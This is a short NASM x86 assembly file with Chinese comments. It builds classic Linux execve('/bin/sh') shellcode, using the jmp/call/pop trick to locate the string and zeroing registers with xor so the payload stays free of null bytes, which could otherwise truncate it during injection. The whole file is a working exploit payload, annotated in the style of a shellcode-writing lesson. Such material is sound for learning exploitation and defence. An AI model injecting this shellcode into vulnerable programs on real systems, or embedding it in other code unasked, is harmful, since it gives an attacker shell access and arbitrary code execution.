section .text
global main
main:
	jmp getstraddr       ;call next,pop用于获取call下一条指令地址
	                     ;本程序中也就是字符串/bin/sh的地址

start:	
	pop esi              ;获取cmd字符串地址
	mov [esi+8],esi      ;填充argc【】数组第一个元素
	xor eax,eax          ;得到0；源码中不应该出现0，否则会被截断
	mov [esi+7],al       ;/bin/sh后面要用0截断
	mov [esi+12],eax     ;填充argc【】数组第二个元素，必须是空指针
	mov edx,eax          ;第三个参数
	mov al,11            ;系统调用号，为了避免出现0，所以只给al赋值
	                     ;11是execve的调用号
	mov ebx,esi          ;第一个参数，是/bin/sh的地址
	lea ecx,[esi+8]      ;第二个参数，是argc【】数组的地址
	int 0x80             ;使用int 0x80中断调用系统函数

getstraddr:
	call start

str:
cmd db "/bin/sh",0h
straddr dd 0
nulladdr dd 0
;char* argc[] = {cmd,NULL}
;execve(cmd, argc, 0);

